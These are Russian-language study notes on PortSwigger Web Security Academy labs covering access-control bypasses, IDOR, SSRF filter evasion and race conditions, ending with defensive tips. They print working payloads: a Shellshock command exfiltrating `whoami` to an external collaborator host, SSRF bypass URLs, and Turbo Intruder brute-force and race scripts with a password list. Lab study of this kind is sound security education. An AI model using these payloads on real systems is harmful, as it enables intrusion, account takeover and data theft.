# Access Control
## Теория
https://portswigger.net/web-security/access-control
[[6 - Access Control, SSRF, Race conditions]]
## Privilege escalation

### [Unprotected admin functionality](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality)
Всем приветики в етом чатике.

`/robots.txt` показывает присутствие `/administrator-panel`
### [Unprotected admin functionality with unpredictable URL](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url)
`/robots.txt` не находится. Капец.

Полазили по сайтику немного с открытым бурпом и на вкладке Target - Site map видим endpoint `/admin-6v4iji`

Альтернативно простой просмотр исходного кода страницы показывает следующий код:
```javascript
var isAdmin = false;
if (isAdmin) {
var topLinksTag = document.getElementsByClassName("top-links")[0];
var adminPanelTag = document.createElement('a');
adminPanelTag.setAttribute('href', '/admin-6v4iji');
adminPanelTag.innerText = 'Admin panel';
topLinksTag.append(adminPanelTag);
var pTag = document.createElement('p');
pTag.innerText = '\';
topLinksTag.appendChild(pTag);
}
```
### [User role controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter)
Логинимся и видим cookie Admin = false. Я активно теряю клетки мозга в этой лабе соу фар.
### [User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)
Тыкаемся слегка по сайту и понимаем, что только смена емайла нам может чем-то помочь.

Отправляем запрос и видим тело: `{"email":"email@a.a"}`, и ответ: `{
  "username": "wiener",
  "email": "email@a.a",
  "apikey": "I9jY6LJ36AZ6ET8WzpooYiYyKQJGUozx",
  "roleid": 1
}`
Понимаем, что есть шанс, что он автоматом заполняет все поля, что мы передали, а не только почту.

Пробуем изменить запрос: `{"email":"a@a.a", "roleid":2}`. И действительно, в ответе roleid 2 и нас пускает на страницу админа.
### [URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)
Есть консолька админа, на которую можно перейти только страницы `/admin`, а доступ с других блокируется.

Настало время снова играться со странными http-заголовками. На этот раз нас интересует `X-Original-URL`. Как и остальные страннекие заголовки, он используется чтобы прокси, которые зачем-то меняют направление запроса, могли оставить инфу о том, куда направлялся изначальный запрос.

Таким образом, если он поддерживается и стоит проверка чисто на изначальный url, а на этот нет, то мы можем получить доступ к панельке админа.

Вот только тыкнуть на кнопочку удаления пользователя и завершить лабу нам не дадут. Если поймать запрос, посылаемый при нажатии на кнопку, увидим GET на `GET /admin/delete?username=carlos`. Ммм, гетом не только получать инфу, моё любимое. Перенесем это снова в `X-Original-URL`.

Получаем ошибку, и, немного потыкавшись, понимаем, что в реальный query надо оставить `?username=carlos`, а остальное оставить в заголовке. Получаем 403, но при этом пользователь удалился, о чем сигнализирует успешная лаба.
### [Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)
Заходим за админа и смотрим на функциональность повышения привилегий. Попробуем на карлосе.

Видим, что отправляется `POST`-запрос на `/admin-roles` с телом `username=carlos&action=upgrade`.

Теперь переключаемся на наш акк. Сначала пытаемся получить доступ к /admin, не даёт. Чисто ради интереса попробуем зайти в /admin-roles и видим что-то интересное - `"Missing parameter 'username'"`. Раз спрашивает username, погнали впишем свой, а заодно прокинем `action=upgrade`. И вот так в браузере становится выполнена лаба, здорово.
### Интересная инфа без лаб на закрепление
Иногда фильтр и сам сервер по-разному интерпретируют нестандартные инпуты.

К примеру, фильтр может пропустить `/DELETEUSER`, хотя сервер всё равно замаппит его в заблокированный `/deleteUser`. 

А ещё иногда `/deleteUser.вообще_чё_попало` замаппится в `/deleteUser`.

И, наконец, `/deleteUser` и `/deleteUser/`.

## IDOR
### [User ID controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter)
Наш url - `/my-account?id=wiener`. Меняем id на carlos и гг.
### [User ID controlled by request parameter, with unpredictable user IDs](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids)
У каждого блога есть гиперссылка на автора, при переходе на которую видим url формата `/blogs?userId=fd10a9c7-1a7e-4f39-9fe2-a552cb3069c9`.

Так что находим пост карлоса и заменяем blogs на my-account (и переименовываем userId в id).
### [User ID controlled by request parameter with data leakage in redirect](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect)
Логинимся, стучимся в `/my-account?id=carlos` и смотрим на ответ в бурпе. Код ответа 302 и браузер нас перекидывает на страницу логина, но вот у ответа почему-то ещё есть тело...... И там как раз страница, которая нам была нужна!! 

Скорее всего, разраб в неправильном порядке закинул рендер страницы и редирект, и при дебаге без бурпа заметить это почти невозможно.
### [User ID controlled by request parameter with password disclosure](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure)
Старым методом получаем доступ к странице админа, осталось получить пароль.

Либо бурпом через просмотр ответа, либо просто в браузере через инспектор, смотрим на поле пароля и видим там `value=<pass>`.
### [Insecure direct object references](https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references)
Видим новую сияющую кнопку `Live chat` и тыкаем по ней. 

Видим ещё более сияющую кнопку `View transcript`, которая скачивает историю этого чата.

В истории http бурпа видим, что для этого использовалась ссылка `/chat/download-transcript/2.txt`. Заменяем 2 на 1 и вуаля.

## Vulnerabilities in multi-step processes
### [Multi-step process with no access control on one step](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step)
Исследуем процесс повышения привилегий от имени админа.

Перед завершением при нажатии на кнопку "да" отправляется запрос с телом `action=upgrade&confirmed=true&username=carlos` на `/admin-roles`.

Осталось послать такой же запрос от имени пользователя. Для этого я просто поменял в бурпе cookie на куку обычного пользователя и сменил username.

Если не через бурп, то можно бы было использовать Postman?, curl или Python (тогда уж любой ЯП подойдёт, погнали на паскале или брейнфаке (одно и то же))
### [Referer-based access control](https://portswigger.net/web-security/access-control/lab-referer-based-access-control)
На этот раз запрос посылается через get-запрос, вот это изменение.

Из интересного - url `/admin-roles?username=carlos&action=upgrade` и `Referer: https://0a30000803db46f08246387e008300e2.web-security-academy.net/admin`

Пробуем через браузер получить `/admin-roles?username=wiener&action=upgrade` и получаем Unathorized. Ну мы так просто не сдаёмся, хватаем запрос бурпом и ~~бежим~~ добавляем указанный ранее заголовок реферер.
## Способы защиты
- чисто обфускация не поможет никогда (как в примере с гуидами)
- whitelist, а не blacklist by default для доступа к ресурсу, если не должен быть общедоступным
- механизм для контроля доступа должен быть один
- на уровне кода заставить разрабов прописывать, у кого есть доступ к ресурсу, с дефолтным значением "никто"
# SSRF
## Теория
[[6 - Access Control, SSRF, Race conditions]]
https://portswigger.net/web-security/ssrf
## Basic SSRF
### [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
В описании товара можно чекнуть сток.

Перехватываем запрос, в его теле url. Меняем его на `https://localhost/admin`. 

Тыкаем удалить пользователя, но запрос посылается от нашего имени и блокируется.

При этом в http history видим, что запрос отправлялся на `/admin/delete?username=carlos`, так что меняем URL в запросе на него.
### [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
Посылаем запрос, перекидываем его в интрудер и меняем содержимое запроса на `stockApi=http://192.168.0.X:8080/admin`, не забывая добавить url-encoding. http-консоль развернуть на https-порте это они сильно придумали, конечно, но иначе реально не работает. Вот так безопасность через обфускацию.

Затем ставим X пейлоадом, `Numbers [0;255]`

При значении 1 пишет missing parameter. Едва ли это админская консоль, которую мы хотели найти, скорее что-то вроде роутера.

А вот при значении 97 получаем 200 вместо 400.
## Filters
### [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
Доступ надо получить к `http://localhost/admin`. Для начала попытаемся напрямую получить доступ к нему доступ, но нам возвращается 400 и `"External stock check blocked for security reasons"`.

Пробуем убрать /admin, но ошибка остаётся.

Переберем разные способы замены localhost. 127.0.0.1, 0, 2130706433 и 017700000001 возвращают 500, а вот 127.1 вернул 200. Только вот добавление /admin всё ещё вызывает блокировку.

URL encode здесь не помог. А вот двойной url encode, как и простая смена регистра помогли. 

Итоговый url выглядит так: `http://127.1/ADMIN/delete?username=carlos`
### [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
Изначальный запрос выглядит так: `http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D1`, что раскодируется в `http://stock.weliketoshop.net:8080/product/stock/check?productId=3&storeId=1`.

Есть сильное предположение, что фильтр будет стоять на присутствие `stock.weliketoshop.net:8080`. Это в явно виде пишется, если убрать это из url, ну так не интересно, я сам догадался!!

Оставим только хост и действительно, получаем ошибку сервера, а не фильтра.

Идём перебирать методы обхода:
1. stock.weliketoshop.net:fakepass@localhost - фильтр
2. stock.weliketoshop.net#localhost - ошибка сервера
При этом ни одинарный, ни двойной url encode не помогают.

А если поменять местами и совместить? К примеру, localhost@stock.weliketoshop.net? Это возвращает 500, то есть фильтр мы действительно обошли. Но что остаётся не так? Если написать localhost#@stock.weliketoshop.net, то снова вызовется фильтр.
А вот если дважды за url-encode-ить хештег, то получаем 200!!

Можно идти на нужную нам страницу. Что интересно, /admin/delete?username=carlos надо ставить не после localhost, а после .net.

Лаба готова, чутка теории - # позволяет передать "фрагмент", который очень похож на параметр запроса. Это заставило меня задуматься о том, а что будет, если передать вместо него ? и это действительно тоже работает!

Конечно, парсер должен быть кривоватый, чтобы такое работало, но что имеем. Можно по этому поводу препода спросить кста.
## Open redirect
### [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
Сначала я пытался получить доступ через наш любимый сток командой `http://192.168.0.12:8080/admin/delete?username=carlos`, но он отказался дружить со сторонним IP.

Не отходя далеко, была найдена кнопка `Next product`, которая формирует следующий запрос: `/product/nextProduct?currentProductId=3&path=/product?productId=4`.

Ух ты, параметр path. Конечно, сейчас она даже не имеет протокола и хоста, подразумевая, что будут использоваться те же, но всё равно имеет смысл попробовать подставить целевые.

Так что в параметр stockApi передаём `/product/nextProduct?currentProductId=3&path=http://192.168.0.12:8080/admin/delete?username=carlos`, что приводит к выполненной лабе.
## Blind 
### [Blind SSRF with out-of-band detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)
Из описания понимаем, что пейлоад надо вставлять в referer. Просто заменяем ссылку оттуда на нашу: `Referer: https://4lqf9m0xil1ab1hv76jsp6l2itokcg05.oastify.com`
### [Blind SSRF with Shellshock exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)
Для начала ставить расширение `Collaborator Everywhere`.

После этого надо добавить домен лабы в scope. Теперь можно полазить по сайтику, а затем глянуть http history - запросы на открытие товаров будут подсвечены красным. Это значит, что наше расширение попробовало подсунуть домен нашего коллаборатора в реферер и получило ответ! В общем, автоматом нашло уязвимость из прошлой лабы.

Что ещё полезнее, так это что он нашел такую же уязвимость в user agent-е.

Теперь воспользуемся уязвимость под названием shellshock, которая приводит к RCE. Для этого составим пейлоад следующего вида:
```
() { :; }; /usr/bin/nslookup $(whoami).cdtn1us5atti3993zeb0hedaa1gt4js8.oastify.com
```
и закинем его в user-agent.

Поскольку мы не знаем ip нужного пользователя, в referer мы закинем `http://192.168.0.1:8080` и сделаем 1 пейлоадом для интрудера. Переберем его от 1 до 255 и нам в коллаборатор реально прилетит имя пользователя - `peter-IFD3JD`.
# Race conditions
## Limit overrun
### [Limit overrun race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)
Для начала пытаемся понять, где здесь вообще может встретиться RC. 

Купон это типичный пример. Прыгаем по сайтику, смотрим на запросы, но особое внимание уделяем именно ему.

Добавляем в корзину требуемую куртку, на которую нам совершенно не хватает средств и переходим в корзину.

Перехватываем запрос добавления купона и перекидываем его в репитер. В custom actions выбираем `New` -> `From template` и там Trigger race condition. Готово, в браузере видим, что куртка стала стоит 30 долларов, так что атака прошла успешно.
### [Bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)
Для этой лабы понадобится Turbo Intruder. Ставим его из магазина расширений.
#### Список потенциальных паролей
```
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
1234567890
michael
x654321
superman
1qaz2wsx
baseball
7777777
121212
000000
```
#### Решение
Перехватываем запрос для логина и отправляем его в Turbo Intruder.

Скрипт выбираем `examples/race-single-packet-attack.py`, но его слегка надо доработать. Вот доработанный вариант:
```python
def queueRequests(target, wordlists):  
      
    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack  
    engine = RequestEngine(endpoint=target.endpoint,  
                           concurrentConnections=1,  
                           engine=Engine.BURP2  
                           )  
  
    # assign the list of candidate passwords from your clipboard  
    passwords = wordlists.clipboard  
  
    # queue a login request using each password from the wordlist  
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked    for password in passwords:  
        engine.queue(target.req, password, gate='1')  
  
    # once every request has been queued  
    # invoke engine.openGate() to send all requests in the given gate simultaneously    engine.openGate('1')  
  
  
def handleResponse(req, interesting):  
    table.add(req)
```
Как можно заметить, в этом варианте скрипта список паролей берется из буфера обмена, так что нужно скопировать лист паролей.

Данная атака может пройти не с первого раза - на половину запросов пишется Invalid..., причем количество таких запросов больше ограничения при последовательном вводе. Вторая половина уже рейтлимитится.

Так что можно убрать неподошедшие пароли и попробовать заново.

С нескольких попыток и ресетов получили пароль football.
### [Multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
Тыкаемся по сайту и смотрим http history.

Видим, что общий flow покупки такой:
1. Отправляем POST на /cart с товаром в теле
2. Отправляем POST на /cart/checkout
В теории, можно инициировать checkout и затем попробовать надобавлять ещё товаров в корзину. Если проверка организована неправильно, то мы можем заплатить только за изначальные товары, но получить и последующие.

Добавляем эти два запроса в группу в репитере и в начало добавляем GET-запрос на главную страницу.

Раним это пару раз для разогрева всех и видим, что стабильно первый запрос занимает больше времени, чем остальные два.

И действительно, если его убрать, то теперь первый запрос будет занимать ощутимо больше времени, чем второй.

Это не так важно. Вместо этого, выберем одновременную отправку запросов. Добавим в корзину гифт карту вручную, а затем одновременно отправим добавление куртки и чекаут.

Может сработать не с первого раза, у меня так вообще с 50-го, но надо было не забывать очищать корзину между попытками.
### [Single-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)
Очевидно, что RC находится в форме смены почты. Создадим несколько запросов в репитере в одной группе с разными адресами почты.

Отправляем последовательно и видим, что всё работает правильно.

А вот при параллельной отправке видим, что адреса почты начали перемешиваться между собой - на адрес 1@... отправили запрос для привязки 4@...

Это вызвано тем, что запрос может существовать только один, и при смене данных запроса в БД они могут смешиваться в параллели.

Оставляем только два запроса - на наш адрес и на карлоса. Получаем такую картину с первого же раза.
![[Access control SSRF Race Cond portswigger-1762774079411.webp]]
Всё, конфёрмим и он действительно даёт привязать. Круто!!
### [Partial construction race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)
Пытаемся зарегаться своей почтой и видим, что наш домен не поддерживается.

Попробовали поприсылать параллельно запросы с нашим юзернеймом на нашем домене и требуемом, но успеха достичь не вышло.

В целом понимаем, что после отправки запроса с правильного емейла мы видим `Please check your emails for your account registration link` с абсолютно неинтересным запросом. Похоже, мы в тупике.

Тупик это про меня, так что идём теперь просто лазить по сайту, искать эндпоинты через бурп и смотреть скриптики через F12 в браузере.

И на /register мы находим static/users.js, в котором есть интересная функция:
```javascript
const confirmEmail = () => {
    const container = document.getElementsByClassName('confirmation')[0];

    const parts = window.location.href.split("?");
    const query = parts.length == 2 ? parts[1] : "";
    const action = query.includes('token') ? query : "";

    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '/confirm?' + action;

    const button = document.createElement('button');
    button.className = 'button';
    button.type = 'submit';
    button.textContent = 'Confirm';

    form.appendChild(button);
    container.appendChild(form);
}
```
На основании этого лезем на /confirm с аргументом ?token=123, видим вот ето 
![[Access control SSRF Race Cond portswigger-1762789234240.webp]]
Но вот после нажатия на вкусную зеленую кнопку получаем incorrect token.

Мы всё ещё на краю сознания держим мысль, что мы хотим стриггерить RC.

Возможный сценарий такой: 
1. Отправляем запрос на регистрацию пользователя.
2. После того, как создался объект пользователя, но до того, как для него сгенерировался токен, отправляем запрос на конфёрм с пустым токеном.
3. Открываем шампанское, потому что мы прошли лабу(бу).

Ну, поехали реализовывать. Для начала проверим, как именно мы сможем прокинуть null-токен.

До этого шел большой кусок с разными конструкциями вроде `token[]=`, вот её и чекнем. 

И действительно, получаем прикольный ответ: `"Incorrect token: Array"`.

Итак, закидываем этот запрос вместе с регистрацией в группу в репитере и пробуем отправить их группой как последовательно, так и параллельно.

Видим проблему, что регистрация всегда занимает дольше, чем попытка входа. Чтобы создать очередь, придется использовать умный Turbo Intruder.

Скрипт выглядит так:
```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0ad60073044889d680595e8c008100ed.web-security-academy.net
Cookie: phpsessionid=LJsEgTmcjfzNNYxa7ji92lc0uuCuV9aZ
Content-Length: 0

'''
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'woof' + currentAttempt
    
        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)
        
        # queue 50 confirmation requests - note that this will probably sent in two separate packets
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)
        
        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    table.add(req)
```
При этом важно в confirmationReq поменять Host и cookie на соответствующие из регистрационного запроса, который мы в турбо интрудер и закинули.

И всё, запускаем атаку, сортируем по 200-м запросам и ищем, где пришло 200 не на регистрационный запрос (у него не будет подписан пейлоад). Что в гайде, что у меня это происходило на 4-й юзернейм.
### [Exploiting time-sensitive vulnerabilities](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)
Знаем, что уязвимость в механизме генерации токена ресета пароля. Проверим, попытавшись ресетнуть самостоятельно.

Получаем токен: `c33d4089b765e6e51f1c527f51c4012ff8cc953e`, что раскодируется из hex-a в `879279485700431470590471736186609665868598666558`. Что-то непонятное, ладно.

Попробуем послать кучку таких запросов параллельно. 

Итог - ответ каждого запроса пришел со значительно разными задержками, и токены получились все разные.

Есть предположение, что мы тут столкнулись с типичным пхпшным ограничением - за одну сессию можно совершать только одно действие одновременно. Попробуем получить две разных сессии и проверить снова.

Достаточно отправить GET-запрос на этот же адрес с вырезанным из запроса cookie, и в ответе нам прилетит новая. Возьмём её отсюда, при этом важно ещё забрать csrf-токен из формы.

Отправляем запросы и видим, что время ответа одинаковое с точностью до миллисекунды. Проверим, разные ли токены, и внезапно ответ нет. А вот добавление разогревочного GET-запроса помогло достичь одинаковых токенов, так что мы точно знаем, что в хэше токена точно участвует время. Пока находка не особо полезная, но вот тот факт, что user=wiener вынесено в отдельный параметр может намекать на то, что в хэше токена юзернейм не участвует. Может ли быть такое, что для двух пользователей может сгенерироваться одинаковый токен?

Итак, снова посылаем два запроса, но меняем у одного из них username на carlos.

При этом меня напугало сильно разное время возвращения ответа на запрос и я долго пытался это пофиксить, но в итоге оказалось, что оно не имеет значения - атака всё равно прошла: я смог использовать ссылку, пришедшую на мою почту, подменив в ней username на carlos. Это действительно сменило его пароль и я смог зайти.
### Полезный совет из теории
Некоторые механизмы контроля сессий, вроде стандартного пхпшного, разрешают только одно одновременное действие в сессию.

RC в таких случаях всё ещё могут существовать, нужно просто использовать разные сессионные токены.